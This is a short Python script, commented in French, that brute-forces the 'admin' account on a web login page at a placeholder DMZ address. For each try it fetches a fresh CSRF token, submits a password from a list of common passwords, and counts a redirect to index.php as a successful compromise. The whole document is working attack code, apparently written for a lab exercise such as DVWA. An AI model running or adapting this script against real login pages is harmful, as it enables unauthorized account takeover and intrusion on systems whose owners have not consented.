# Prérequis : installez les modules suivants dans votre terminal
# pip install requests beautifulsoup4
import requests
from bs4 import BeautifulSoup

url = "http://<IP_PUBLIQUE_DMZ>/login.php"
username = "admin"
passwords = [
    "12345678", "qwertyuiop", "azerty123", "letmein123",
    "1234567890", "abcdefghij", "azertyuiop", "1q2w3e4r5t", "00000000",
    "poiuytrewq", "123123123", "wsxedcrfv", "mnbvcxz", "lkjhgfdsa",
    "iloveyou", "welcome", "monkey", "football", "dragon", "superman", 
    "guest", "admin123", "password!", "12345678.", "qwertyuiop#", 
    "azerty123!", "letmein123?", "qwerty1234", "azerty9876", "11223344",
    "password55", "adminadmin", "qazwsxedc", "plmoknijb", "123456789",
    "qwertyuiopas", "azertyuiopqs", "1234567812", "0000000000",
    "poiuytrewqlk", "1231231231", "wsxedcrfv1", "mnbvcxz123", "lkjhgfdsa1",
    "iloveyou123", "welcome123", "monkey123", "football123", "dragon123",
    "superman123", "guest12345", "admin12345",
    
    "password"
]

session = requests.Session()

for pwd in passwords:
    # 1. Récupérer la page de login pour extraire le token CSRF
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    
    if not token_input:
        print("Token CSRF non trouvé !")
        break
    token = token_input.get('value')

    # 2. Soumettre le formulaire avec le token valide
    data = {
        'username': username,
        'password': pwd,
        'Login': 'Login',
        'user_token': token
    }
    response = session.post(url, data=data, allow_redirects=False)

    # 3. Vérification de la compromission (Code 302 vers index.php)
    if response.status_code == 302 and 'index.php' in response.headers.get('Location', ''):
        print(f"[SUCCÈS] Mot de passe trouvé : {pwd}")
        break
    else:
        print(f"[ÉCHEC] {pwd}")
